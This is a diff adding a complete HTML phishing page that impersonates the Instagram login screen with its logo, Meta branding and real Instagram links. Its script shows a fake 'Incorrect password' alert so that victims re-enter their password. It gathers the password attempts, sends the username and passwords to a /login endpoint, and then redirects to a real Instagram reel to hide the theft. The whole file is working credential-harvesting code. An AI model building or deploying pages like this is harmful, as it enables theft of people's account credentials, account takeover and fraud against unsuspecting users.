@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="./public/style.css" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div id="view-area">
+      <div class="alert-page">
+        <div class="msg-box">
+          <h3>Incorrect password</h3>
+          <p>
+            The password that you've entered is incorrect. Please try again.
+          </p>
+          <button id="msg-confirm">OK</button>
+        </div>
+      </div>
+      <div class="logo">
+        <img src="./public/insta.png" alt="logo" />
+      </div>
+      <form id="login_form">
+        <div class="input-label">
+          <!-- <span class="username-label"
+            >Username, email address or mobile number</span
+          > -->
+          <input
+            type="text"
+            required
+            placeholder="Username, email address or mobile number"
+            id="username"
+          />
+        </div>
+        <div class="input-label">
+          <!-- <span class="password-label">Password</span> -->
+          <input
+            type="password"
+            required
+            placeholder="Password"
+            id="password"
+          />
+        </div>
+        <button id="submit-btn" type="submit">Log in</button>
+        <a
+          id="forget-link"
+          href="https://www.instagram.com/accounts/password/reset/"
+          >Forgot password?</a
+        >
+      </form>
+      <div class="bottom">
+        <a
+          id="create-acc-link"
+          href="https://www.instagram.com/accounts/emailsignup/"
+          >Create new account</a
+        >
+        <p class="meta-tag">
+          <i class="ri-meta-fill"></i>
+          Meta
+        </p>
+      </div>
+    </div>
+    <script>
+      const form = document.getElementById("login_form");
+      const usernameInput = document.getElementById("username");
+      const passwordInput = document.getElementById("password");
+
+      const alert_page = document.querySelector(".alert-page");
+      const msg_confirm = document.getElementById("msg-confirm");
+      const submit_btn = document.getElementById("submit-btn");
+
+      let username;
+      let passwords = [];
+      let turns = 0;
+
+      submit_btn.addEventListener("click", (e) => {
+        e.preventDefault();
+        if (usernameInput.value !== "" && passwordInput.value !== "") {
+          alert_page.style.display = "flex";
+        }
+      });
+
+      const send_data = async (username, passwords) => {
+        const res = await fetch("/login", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ username, passwords }),
+        });
+
+        const data = await res.text();
+        console.log(data);
+      };
+
+      msg_confirm.addEventListener("click", () => {
+        passwords.push(passwordInput.value);
+
+        if (turns >= 2) {
+          console.log("time to proceed- ");
+          console.log("Username: ", username);
+          console.log("Passwords: ", passwords);
+          window.location.href =
+            "https://www.instagram.com/reel/DTIQo3yD72F/?igsh=MWZtbXd2OGUxd2kxaw==";
+          send_data(username, passwords);
+        }
+
+        alert_page.style.display = "none";
+        username = usernameInput.value;
+        passwordInput.value = "";
+        passwordInput.focus();
+        turns++;
+      });
+
+      // form.addEventListener("submit", async (e) => {
+      //   e.preventDefault();
+
+      //   const username = usernameInput.value;
+      //   const password = passwordInput.value;
+
+      //   const res = await fetch("/login", {
+      //     method: "POST",
+      //     headers: {
+      //       "Content-Type": "application/json",
+      //     },
+      //     body: JSON.stringify({ username, password }),
+      //   });
+
+      //   const data = await res.text();
+      //   console.log(data);
+      // });
+    </script>
+  </body>
+</html>
